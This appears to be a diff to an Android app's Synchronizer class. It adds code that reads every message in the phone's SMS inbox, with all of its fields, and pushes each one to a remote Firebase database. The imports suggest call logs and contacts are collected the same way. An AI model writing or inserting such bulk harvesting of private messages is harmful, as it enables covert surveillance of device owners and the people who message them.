@@ -5,6 +5,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.support.v4.app.ActivityCompat;
@@ -33,13 +34,28 @@ class Synchronizer {
     }
 
     private void sendMessages() {
-        // TODO: 12/27/2018
+        // public static final String INBOX = "content://sms/inbox";
+// public static final String SENT = "content://sms/sent";
+// public static final String DRAFT = "content://sms/draft";
+        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
 
-        // Write a message to the database
-        FirebaseDatabase database = FirebaseDatabase.getInstance();
-        DatabaseReference myRef = database.getReference("message");
+        if (cursor.moveToFirst()) { // must check the result to prevent exception
+            do {
+                String msgData = "";
+                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
+                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
+                }
+                // use msgData
+                // Write a message to the database
+                FirebaseDatabase database = FirebaseDatabase.getInstance();
+                DatabaseReference myRef = database.getReference("messages").push();
 
-        myRef.setValue("Hello, World!");
+                myRef.setValue(msgData);
+            } while (cursor.moveToNext());
+        } else {
+            // empty box, no SMS
+        }
+
     }
 
     private void sendContacts() {
